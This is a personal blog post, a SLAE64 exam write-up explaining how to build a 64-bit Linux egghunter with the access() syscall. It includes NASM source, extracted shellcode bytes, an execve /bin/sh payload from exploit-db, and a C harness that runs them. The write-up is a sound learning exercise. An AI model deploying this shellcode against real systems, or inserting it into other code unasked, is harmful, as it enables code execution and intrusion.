<!DOCTYPE html>
<html lang="en"><!--
 __  __                __                                     __
/\ \/\ \              /\ \             __                    /\ \
\ \ \_\ \   __  __    \_\ \      __   /\_\      __       ___ \ \ \/'\
 \ \  _  \ /\ \/\ \   /'_` \   /'__`\ \/\ \   /'__`\    /'___\\ \ , <
  \ \ \ \ \\ \ \_\ \ /\ \L\ \ /\  __/  \ \ \ /\ \L\.\_ /\ \__/ \ \ \\`\
   \ \_\ \_\\/`____ \\ \___,_\\ \____\ _\ \ \\ \__/.\_\\ \____\ \ \_\ \_\
    \/_/\/_/ `/___/> \\/__,_ / \/____//\ \_\ \\/__/\/_/ \/____/  \/_/\/_/
                /\___/                \ \____/
                \/__/                  \/___/

Powered by Hydejack v8.1.1 <https://hydejack.com/>
--><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"><meta http-equiv="x-ua-compatible" content="ie=edge"><title>Egghunter (64-bit Linux) using access() syscall | Silvia’s blog</title><meta name="generator" content="Jekyll v3.8.3" /><meta property="og:title" content="Egghunter (64-bit Linux) using access() syscall" /><meta name="author" content="Silvia Väli" /><meta property="og:locale" content="en" /><meta name="description" content="This blog post covers the 3/7 task of the SLAE certificate exam where we are going to discuss what is virtual address space, virtual addresses as well as how to utilise the knowledge on that to create our very own egghunter. Let’s hunt some eggs! Student ID: SLAE64 - 1594" /><meta property="og:description" content="This blog post covers the 3/7 task of the SLAE certificate exam where we are going to discuss what is virtual address space, virtual addresses as well as how to utilise the knowledge on that to create our very own egghunter. Let’s hunt some eggs! Student ID: SLAE64 - 1594" /><link rel="canonical" href="http://localhost:4000/blog/2019-02-25-blog-SLAE3/" /><meta property="og:url" content="http://localhost:4000/blog/2019-02-25-blog-SLAE3/" /><meta property="og:site_name" content="Silvia’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-02-25T00:00:00+02:00" /> <script type="application/ld+json"> {"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/profile.jpg"},"name":"Silvia Väli"},"@type":"BlogPosting","url":"http://localhost:4000/blog/2019-02-25-blog-SLAE3/","headline":"Egghunter (64-bit Linux) using access() syscall","dateModified":"2019-02-25T00:00:00+02:00","datePublished":"2019-02-25T00:00:00+02:00","author":{"@type":"Person","name":"Silvia Väli"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/2019-02-25-blog-SLAE3/"},"description":"This blog post covers the 3/7 task of the SLAE certificate exam where we are going to discuss what is virtual address space, virtual addresses as well as how to utilise the knowledge on that to create our very own egghunter. Let’s hunt some eggs! Student ID: SLAE64 - 1594","@context":"http://schema.org"}</script><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Silvia's blog"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="application-name" content="Silvia's blog"><meta name="msapplication-config" content="/assets/ieconfig.xml"><meta name="theme-color" content="rgb(25,55,71)"><meta name="generator" content="Hydejack v8.1.1" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Silvia's blog" /><link rel="alternate" href="http://localhost:4000/blog/2019-02-25-blog-SLAE3/" hreflang="en"><link rel="shortcut icon" href="/assets/icons/favicon.ico"><link rel="apple-touch-icon" href="/assets/icons/icon.png"><link rel="manifest" href="/assets/manifest.json"><link rel="dns-prefetch" href="https://fonts.googleapis.com"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="dns-prefetch" href="/" id="_baseURL"><link rel="dns-prefetch" href="/assets/js/hydejack-8.1.1.js" id="_hrefJS"><link rel="dns-prefetch" href="/sw.js" id="_hrefSW"><link rel="dns-prefetch" href="/assets/bower_components/fontfaceobserver/fontfaceobserver.standalone.js" id="_hrefFFO"><link rel="dns-prefetch" href="/assets/bower_components/katex/dist/katex.min.js" id="_hrefKatexJS"><link rel="dns-prefetch" href="/assets/bower_components/katex/dist/katex.min.css" id="_hrefKatexCSS"><link rel="dns-prefetch" href="/assets/img/swipe.svg" id="_hrefSwipeSVG"> <script>!function(e,t){"use strict";function n(e,t,n,r){e.addEventListener?e.addEventListener(t,n,r):e.attachEvent?e.attachEvent("on"+t,n):e["on"+t]=n}e.loadJS=function(e,r){var o=t.createElement("script");o.src=e,r&&n(o,"load",r,{once:!0});var a=t.scripts[0];return a.parentNode.insertBefore(o,a),o},e._loaded=!1,e.loadJSDeferred=function(r,o){function a(){e._loaded=!0,o&&n(d,"load",o,{once:!0});var r=t.scripts[0];r.parentNode.insertBefore(d,r)}var d=t.createElement("script");return d.src=r,e._loaded?a():n(e,"load",a,{once:!0}),d},e.setRel=e.setRelStylesheet=function(e){function n(){this.rel="stylesheet"}var r=t.getElementById(e);r.addEventListener?r.addEventListener("load",n,{once:!0}):r.onload=n}}(window,document); !function(a){"use strict";var b=function(b,c,d){function e(a){return h.body?a():void setTimeout(function(){e(a)})}function f(){i.addEventListener&&i.removeEventListener("load",f),i.media=d||"all"}var g,h=a.document,i=h.createElement("link");if(c)g=c;else{var j=(h.body||h.getElementsByTagName("head")[0]).childNodes;g=j[j.length-1]}var k=h.styleSheets;i.rel="stylesheet",i.href=b,i.media="only x",e(function(){g.parentNode.insertBefore(i,c?g:g.nextSibling)});var l=function(a){for(var b=i.href,c=k.length;c--;)if(k[c].href===b)return a();setTimeout(function(){l(a)})};return i.addEventListener&&i.addEventListener("load",f),i.onloadcssdefined=l,l(f),i};"undefined"!=typeof exports?exports.loadCSS=b:a.loadCSS=b}("undefined"!=typeof global?global:this); !function(a){if(a.loadCSS){var b=loadCSS.relpreload={};if(b.support=function(){try{return a.document.createElement("link").relList.supports("preload")}catch(b){return!1}},b.poly=function(){for(var b=a.document.getElementsByTagName("link"),c=0;c<b.length;c++){var d=b[c];"preload"===d.rel&&"style"===d.getAttribute("as")&&(a.loadCSS(d.href,d,d.getAttribute("media")),d.rel=null)}},!b.support()){b.poly();var c=a.setInterval(b.poly,300);a.addEventListener&&a.addEventListener("load",function(){b.poly(),a.clearInterval(c)}),a.attachEvent&&a.attachEvent("onload",function(){a.clearInterval(c)})}}}(this); </script> <script>!function(w, d) { w._noPushState = false; w._noDrawer = false; /**/ loadJS(d.getElementById('_hrefFFO').href, function() { if ('Promise' in w) Promise.all([ new FontFaceObserver('Noto Sans').load(), new FontFaceObserver('Roboto Slab').load(), ]).then(function f() { d.body.classList.add('font-active'); }, function() {}); }); /**/ }(window, document);</script> <!--[if gt IE 8]><!----><link rel="stylesheet" href="/assets/css/hydejack-8.1.1.css"><link rel="stylesheet" href="/assets/icomoon/style.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab:400|Noto+Sans:400,400i,700,700i"> <noscript><style> html { font-family: Noto Sans, Helvetica, Arial, sans-serif!important; } h1, h2, h3, h4, h5, h6, .h1, .h2, .h3, .h4, .h5, .h6, .heading { font-family: Roboto Slab, Helvetica, Arial, sans-serif!important; }</style></noscript><style id="_pageStyle"> .content a:not(.btn){color:#4fb1ba;border-color:rgba(79,177,186,0.2)}.content a:not(.btn):hover{border-color:#4fb1ba}:focus{outline-color:#4fb1ba !important}.btn-primary{color:#fff;background-color:#4fb1ba;border-color:#4fb1ba}.btn-primary:focus,.btn-primary.focus,.form-control:focus,.form-control.focus{box-shadow:0 0 0 3px rgba(79,177,186,0.5)}.btn-primary:hover,.btn-primary.hover{color:#fff;background-color:#409ba3;border-color:#409ba3}.btn-primary:disabled,.btn-primary.disabled{color:#fff;background-color:#4fb1ba;border-color:#4fb1ba}.btn-primary:active,.btn-primary.active{color:#fff;background-color:#409ba3;border-color:#409ba3}::selection{color:#fff;background:#4fb1ba}::-moz-selection{color:#fff;background:#4fb1ba}</style><!--<![endif]--><body><div id="_navbar" class="navbar fixed-top"><div class="content"><div class="nav-btn-bar"> <span class="sr-only">Jump to:</span> <a id="_menu" class="nav-btn no-hover fl" href="#_navigation"> <span class="sr-only">Navigation</span> <span class="icon-menu"></span> </a></div></div></div><hr class="sr-only" hidden /> <hy-push-state replace-ids="_main" link-selector="a[href]:not([href*='/assets/']):not(.external):not(.no-push-state)" duration="250" script-selector="script:not([type^='math/tex'])" prefetch ><main id="_main" class="content fade-in layout-post" role="main" data-color="rgb(79,177,186)" data-theme-color="rgb(25,55,71)" data-image="/assets/img/sidebar-bg.jpg" data-overlay ><article id="post-blog-blog-SLAE3" class="page post mb6" role="article"><header><h1 class="post-title"> Egghunter (64-bit Linux) using access() syscall</h1><p class="post-date heading"> <time datetime="2019-02-25T00:00:00+02:00">25 Feb 2019</time> in <a href="/blog/" class="flip-title">Blog</a><div class="hr pb0"></div></header><p>This blog post covers the 3/7 task of the <a href="https://www.pentesteracademy.com/course?id=7">SLAE certificate exam</a> where we are going to discuss what is virtual address space, virtual addresses as well as how to utilise the knowledge on that to create our very own egghunter. Let’s hunt some eggs!<br /> <b>Student ID</b>: SLAE64 - 1594<p><b>Task:</b><ul><li>Study about the Egg Hunter shellcode<li>Create a working demo of the Egghunter<li>Should be configurable for different payloads</ul><h2 id="what-is-an-egghunter">What is an egghunter</h2><p>When you think of the word “egghunter”, it shouldn’t be too hard to guess that we are going to be dealing with some type of a search or hunt for something valuable. In this case the value lies in the egg which is a unique token that helps us on the right track of executiong our shellcode. Essentially egghunter is a piece of code which searches through the VAS (<em>Virtual Address Space</em>) looking for a token which we have specified. In order to accomplish this task, we have to have an understanding on what VAS is.<h2 id="virtual-address-space">Virtual Address Space</h2><p>64-bit architecture presents us with a <code class="MathJax_Preview">2^{64}</code><script type="math/tex">2^{64}</script> = 256TB virtual address space which is divided into user space and kernel space address ranges as shown on the image below. These are the same addresses you see when you are debugging your application in GDB and should not be confused with physical addresses.<h3 id="user-and-kernel-space">User and kernel space</h3><p>If you would examine the addresses for user and kernel space, it is also pretty clear about the number of actually addressable bits which is <code class="MathJax_Preview">2^{48}</code><script type="math/tex">2^{48}</script> for user and kernel space combined. At the moment this is found feasible as current CPUs only use the lowr of 48 bits and more is not needed.<p class="figure">
  <hy-img root-margin="512px"  src="/assets/img/SLAE/vas.png" alt="" class="lead" >
    <noscript><img data-ignore  src="/assets/img/SLAE/vas.png" alt="" class="lead" /></noscript>
    <span class="loading" slot="loading" hidden>
      <span class="icon-cog"></span>
    </span>
  </hy-img> Virtual Address Space for 64-bit architecture<h3 id="canonical-addresses">Canonical addresses</h3><p>Another thing you can notice is that canonical addresses for user and kernel space follow a certain structure. If you dig into <a href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-manual-325462.pdf">Intel 64 and IA-32 architectures manual</a> they give a pretty direct definition for it, which is: “In 64-bit mode, an address is considered to be in canonical form if address bits 63 through to the most-significant implemented bit by the microarchitecture are set to either all ones or all zeros.” The most significant bit here being the 48th bit means in case we are dealing with an address belonging to the user space, bits 48-64 are set to 0 and address belonging to kernel space those bits (48-64) are set to 1.<p class="figure">
  <hy-img root-margin="512px"  src="/assets/img/SLAE/range.png" alt="" class="lead" data-width="800" data-height="100" >
    <noscript><img data-ignore  src="/assets/img/SLAE/range.png" alt="" class="lead" data-width="800" data-height="100" /></noscript>
    <span class="loading" slot="loading" hidden>
      <span class="icon-cog"></span>
    </span>
  </hy-img> Canonical addresses - user and kernel space. 1 hex digit presents a 4 digit binary number example: 0x8 = 1000.<h3 id="memory-regions-of-a-mapped-process">Memory regions of a mapped process</h3><p>Virtual address space is a range of virtual memory addresses that the OS has made available for every process individually.<p>It also helps to examine and understand how an executed program is mapped into memory regions and what are their access permissions. For that we can use a command <code class="highlighter-rouge">cat /proc/&lt;pid&gt;/maps</code>. Based on the example below:<ul><li>we can see that program itself is mapped within 3 pages (1 = 4KB which we can verify with the following command <code class="highlighter-rouge">getconf PAGE_SIZE</code> - 4096 which is 0x1000)<li>we can also see that each of the mapped memory regions is grouped by their access permissions RWX (read/write/execute)<ul><li>00400000-00401000 r-xp region is where our executable code lies within<li>00601000-00602000 rw-p is the data section<li>00600000-00601000 r–p contains data that is only readable, like static data, constants</ul><li>all addresses except for the very last one for vsyscall are user space addresses</ul><div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /proc/3996/maps
00400000-00401000 r-xp 00000000 08:04 4719226                            /home/osboxes/Documents/SLAE/test
00600000-00601000 r--p 00000000 08:04 4719226                            /home/osboxes/Documents/SLAE/test
00601000-00602000 rw-p 00001000 08:04 4719226                            /home/osboxes/Documents/SLAE/test
7f385cc75000-7f385ce35000 r-xp 00000000 08:01 528998                     /lib/x86_64-linux-gnu/libc-2.23.so
7f385ce35000-7f385d035000 ---p 001c0000 08:01 528998                     /lib/x86_64-linux-gnu/libc-2.23.so
7f385d035000-7f385d039000 r--p 001c0000 08:01 528998                     /lib/x86_64-linux-gnu/libc-2.23.so
7f385d039000-7f385d03b000 rw-p 001c4000 08:01 528998                     /lib/x86_64-linux-gnu/libc-2.23.so
7f385d03b000-7f385d03f000 rw-p 00000000 00:00 0
7f385d03f000-7f385d065000 r-xp 00000000 08:01 528970                     /lib/x86_64-linux-gnu/ld-2.23.so
7f385d24a000-7f385d24d000 rw-p 00000000 00:00 0
7f385d264000-7f385d265000 r--p 00025000 08:01 528970                     /lib/x86_64-linux-gnu/ld-2.23.so
7f385d265000-7f385d266000 rw-p 00026000 08:01 528970                     /lib/x86_64-linux-gnu/ld-2.23.so
7f385d266000-7f385d267000 rw-p 00000000 00:00 0
7ffd6f5e8000-7ffd6f609000 rw-p 00000000 00:00 0                          [stack]
7ffd6f634000-7ffd6f637000 r--p 00000000 00:00 0                          [vvar]
7ffd6f637000-7ffd6f639000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
</code></pre></div></div><p>I’d like to stop on the access permissions of the memory regions for one extra moment here and raise a question: how can we apply this knowledge for implementing an egg hunter? Well our goal is to find the egg token from somewhere in memory. We do not know where the token we are looking for might be, so do we have to search through the entire virtual address space? As it is rather large maybe there is a way we could decrement that search time? We know that contiguous virtual memory is divided into pages and for all regions memory allocated is a multiple of 4KB. Each one of those pages has specific permissions which are applied to all addresses within the range of the page.<p>We can assume that our egg would be on an address which is accessible to us therefore we would need to find a way to test for accessible/inaccessible addresses. Syscalls come to the rescue!<h3 id="how-can-we-validate-if-an-address-is-accessible">How can we validate if an address is accessible?</h3><p>Referring to the <a href="http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf">Skape’s paper</a> as many have done in egghunter write ups before me, I stumbled upon the <code class="highlighter-rouge">access()</code> syscall which is essentially meant to validate permissions of a file. Access syscall has the following format where 2 arguments need to be specified: <code class="highlighter-rouge">int access(const char *pathname, int mode);</code>. It expects 1st argument to be a memory address and 2nd argument should specify the permission we want to test for: 0 - F_OK (existance), 1 - X_OK (execute), 2 - W_OK (write), 4 - R_OK (read). Not letting the definition limit us, what i learned was that we can submit any address to this syscall to validate if the address is accessible or it will produce an EFAULT (<code class="highlighter-rouge">0xf...f2 in RAX after returning from syscall</code>) in case it is not. I had never seen this syscall that way and I find it extremely awesome!<p class="figure">
  <hy-img root-margin="512px"  src="/assets/img/SLAE/access.png" alt="" class="lead" data-width="800" data-height="100" >
    <noscript><img data-ignore  src="/assets/img/SLAE/access.png" alt="" class="lead" data-width="800" data-height="100" /></noscript>
    <span class="loading" slot="loading" hidden>
      <span class="icon-cog"></span>
    </span>
  </hy-img> Searching through virtual address space by testing the first address of every page to validate if the addresses within the page are accessible.<p>So let’s try to implement our egg hunter based on all the knowledge we have stuffed into our brain now :D<h3 id="egghunter-implementation">Egghunter implementation</h3><p>In <strong>Step 1</strong> and <strong>Step 2</strong> (code example below) I am preparing the arguments for the <code class="highlighter-rouge">access()</code> syscall we want to be using. We want to validate whether the address is accessible (F_OK - 0) so I zero out the RSI register which by convention is the 2nd parameter passed on to the syscall. To initialize the 1st parameter we will use the value at RSI to pop it to RDI as well. Within <code class="highlighter-rouge">go_to_next_page:</code> section I <code class="highlighter-rouge">or</code> the lower 16 bits of RDI (or di, 0xfff) and by incrementing RDI I reach to the beginning of a page at 0x1000.<p>In <strong>Step 3</strong> I assign the <code class="highlighter-rouge">accept()</code> syscall number 21 in decimal to RAX by convention and make the call. As a result in <strong>Step 4</strong> I expect to check if an <a href="http://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html">EFAULT (Bad address)</a> occured which is the reason for <code class="highlighter-rouge">cmp al, 0xf2</code>. If the first address of the page turns out to be inaccessible I know that the rest of the addresses within that page will be as well as same permissions are applied to the whole page. Therefore we can jump back to <code class="highlighter-rouge">go_to_next_page</code> to get the start address of the next page and try that instead.<p>If it occurs in <strong>Step 4</strong> that the address is accessible to us and we did not receive EFAULT we move a 4 byte value <code class="highlighter-rouge">0x9050904f</code> to EAX and increment the lower byte to get our egg value. You might be asking why do we do it this way. The reason for that is this way we wouldn’t stumble upon our egg value within the egg hunter code as our goal is to find it from the beginning of our shellcode instead. Now that we have the egg value in EAX (don’t forget little-endian here) we will use the <a href="http://faydoc.tripod.com/cpu/scasd.htm">scasd</a> scan a string command to compare the egg value we search for with the value in RAX.<p>PS! RAX by convention holds the return value from the syscall. In our case it will be an address in memory which would possibly hold the value of the egg in the beginning of the shellcode.<p>If the values being checked for do not match, we can move on to another address within the same page. However if they do, we know that the address for our shellcode is in RDI so we make the jump there instead.<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>global _start
section .text
_start:

;STEP1
	;int access(const char *pathname, int mode);
	xor rsi, rsi
	push rsi
	pop rdi

;STEP2
go_to_next_page:
	or di, 0xfff
	inc rdi

;STEP3
forward_4_bytes:
	xor rax, rax
	mov al, 21
	syscall

;STEP4
efault_check:
	cmp al, 0xf2
	jz go_to_next_page
	mov eax, 0x9050904f
	inc al
	scasd
	jnz forward_4_bytes
	jmp rdi

</code></pre></div></div><p>So let’s dump the egg hunter code with objdump in order to include it to our test C script to validate it’s working:<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> objdump -d ./egghunter|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x48\x31\xf6\x56\x5f\x66\x81\xcf\xff\x0f\x48\xff\xc7\x48\x31\xc0\xb0\x15\x0f\x05\x3c\xf2\x74\xed\xb8\x4f\x90\x50\x90\xfe\xc0\xaf\x75\xeb\xff\xe7"
</code></pre></div></div><p>In the final C program I will be also using the 21-byte shellcode from: <a href="https://www.exploit-db.com/exploits/41750">https://www.exploit-db.com/exploits/41750</a>.<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
;================================================================================
; Shellcode (python) :
shellcode = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
;================================================================================
...
</code></pre></div></div><p>This is how the final program with the defined EGG, egg hunter code and shellcode payload from exploit-db.com is looking like:<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#define EGG "\x50\x90\x50\x90"

unsigned char hunter[] = \
"\x48\x31\xf6\x56\x5f\x66\x81\xcf\xff\x0f\x48\xff\xc7\x48\x31\xc0\xb0\x15\x0f\x05\x3c\xf2\x74\xed\xb8\x4f\x90\x50\x90\xfe\xc0\xaf\x75\xeb\xff\xe7";

unsigned char payload[] = EGG "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05";

int main(void) {
	printf("Egg hunter's size (bytes): %lu\n", strlen(hunter));
	printf("Payload's size (bytes): %lu\n", strlen(payload));
	int (*ret)() = (int(*)())hunter;
	ret();
}

</code></pre></div></div><p>Let’s run it:<p class="figure">
  <hy-img root-margin="512px"  src="/assets/img/SLAE/task3.png" alt="" class="lead" data-width="800" data-height="100" >
    <noscript><img data-ignore  src="/assets/img/SLAE/task3.png" alt="" class="lead" data-width="800" data-height="100" /></noscript>
    <span class="loading" slot="loading" hidden>
      <span class="icon-cog"></span>
    </span>
  </hy-img><p>Also if you used the program with strace as <code class="highlighter-rouge">strace ./shellcode</code> you would see how the search is trying to identify the egg:<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
ccess("", F_OK)                        = -1 ENOENT (No such file or directory)
access("", F_OK)                        = -1 ENOENT (No such file or directory)
access("", F_OK)                        = -1 ENOENT (No such file or directory)
access("", F_OK)                        = -1 ENOENT (No such file or directory)
access("", F_OK)                        = -1 ENOENT (No such file or directory)
access("", F_OK)                        = -1 ENOENT (No such file or directory)
...
access("", F_OK)                        = -1 ENOENT (No such file or directory)
access("", F_OK)                        = -1 ENOENT (No such file or directory)
access("P\220P\220\367\346PH\277/bin//shWH\211\347\260;\17\5", F_OK) = -1 ENOENT (No such file or directory)
execve("/bin//sh", NULL, NULL)          = 0
...
</code></pre></div></div><hr /><ul><li>Egghunter.nasm: <br /><a href="https://github.com/silviavali/SLAE/blob/master/task3/egghunter.nasm">https://github.com/silviavali/SLAE/blob/master/task3/egghunter.nasm</a><li>Shellcode.c used for testing:<br /> <a href="https://github.com/silviavali/SLAE/blob/master/task3/shellcode.c">https://github.com/silviavali/SLAE/blob/master/task3/shellcode.c</a></ul></article><hr class="dingbat related" /><aside class="about related mt4 mb4" role="complementary"><div class="author mt4"> <hy-img src="/assets/img/profile.jpg" class="avatar" alt="Silvia Väli" root-margin="512px" > <noscript><img data-ignore src="/assets/img/profile.jpg" class="avatar" alt="Silvia Väli" /></noscript> <span class="loading" slot="loading" hidden> <span class="icon-cog"></span> </span> </hy-img><h2 class="page-title hr"> About</h2><p>My name is Silvia. This blog just contains various things that interest me, but probably relatively more assembly stuff. I count myself quite new to the ITsec community as I am only 2 years in.<div class="sidebar-social"> <span class="sr-only">Social:</span><ul><li> <a href="https://twitter.com/silviavaliSV" title="Twitter" class="no-mark-external"> <span class="icon-twitter"></span> <span class="sr-only">Twitter</span> </a><li> <a href="https://github.com/silviavali" title="GitHub" class="no-mark-external"> <span class="icon-github"></span> <span class="sr-only">GitHub</span> </a></ul></div></div></aside><aside class="related mb4" role="complementary"><h2 class="hr">Related Posts</h2><ul class="related-posts"><li> <a href="/blog/2019-02-25-blog-SLAE4/" class="h4 flip-title"> <span>Writing a 64-bit custom encoder</span> </a> <time class="heading faded fine" datetime="2019-02-25T00:00:00+02:00">25 Feb 2019</time><li> <a href="/blog/2019-01-25-blog-SLAE2/" class="h4 flip-title"> <span>64-bit reverse shell with passphrase protection</span> </a> <time class="heading faded fine" datetime="2019-01-25T00:00:00+02:00">25 Jan 2019</time><li> <a href="/blog/2019-01-15-blog-SLAE1/" class="h4 flip-title"> <span>64-bit bindshell with a passphrase protection</span> </a> <time class="heading faded fine" datetime="2019-01-15T00:00:00+02:00">15 Jan 2019</time></ul></aside><footer role="contentinfo"><hr/><p><small class="copyright">© 2019. All rights reserved. </small><p><small>Powered by <a class="external" href="https://hydejack.com/">Hydejack</a> v<span id="_version">8.1.1</span></small><hr class="sr-only"/></footer></main><hy-drawer class="" align="left" threshold="10" touch-events prevent-default ><header id="_sidebar" class="sidebar" role="banner"><div class="sidebar-bg sidebar-overlay" style="background-color:rgb(25,55,71);background-image:url(/assets/img/sidebar-bg.jpg)"></div><div class="sidebar-sticky"><div class="sidebar-about"> <a class="no-hover" href="/" tabindex="-1"> <img src="/assets/img/profile.jpg" class="avatar" alt="Silvia's blog" data-ignore /> </a><h2 class="h1"><a href="/">Silvia's blog</a></h2><p class=""> Random notes or stuff I am curious about.</div><nav class="sidebar-nav heading" role="navigation"> <span class="sr-only">Navigation:</span><ul><li> <a id="_navigation" href="/blog/" class="sidebar-nav-item active" > Blog </a><li> <a href="/about/" class="sidebar-nav-item" > About </a></ul></nav><div class="sidebar-social"> <span class="sr-only">Social:</span><ul><li> <a href="https://twitter.com/silviavaliSV" title="Twitter" class="no-mark-external"> <span class="icon-twitter"></span> <span class="sr-only">Twitter</span> </a><li> <a href="https://github.com/silviavali" title="GitHub" class="no-mark-external"> <span class="icon-github"></span> <span class="sr-only">GitHub</span> </a></ul></div></div></header></hy-drawer><hr class="sr-only" hidden /> </hy-push-state> <!--[if !IE]><!----> <script>loadJSDeferred(document.getElementById('_hrefJS').href);</script> <!--<![endif]--> <script> if ('serviceWorker' in navigator) { navigator.serviceWorker.getRegistration() .then(r => r.unregister()) .catch(() => {}); } </script><h2 class="sr-only" hidden>Templates (for web app):</h2><template id="_animation-template" hidden><div class="animation-main fixed-top"><div class="content"><div class="page"></div></div></div></template> <template id="_loading-template" hidden><div class="loading nav-btn fr"> <span class="sr-only">Loading…</span> <span class="icon-cog"></span></div></template> <template id="_error-template" hidden><div class="page"><h1 class="page-title">Error</h1><p class="lead"> Sorry, an error occurred while loading <a class="this-link" href=""></a>.</div></template> <template id="_back-template" hidden> <a id="_back" class="back nav-btn fl no-hover"> <span class="sr-only">Back</span> <span class="icon-arrow-left2"></span> </a> </template> <template id="_permalink-template" hidden> <a href="#" class="permalink"> <span class="sr-only">Permalink</span> <span class="icon-link"></span> </a> </template></html>
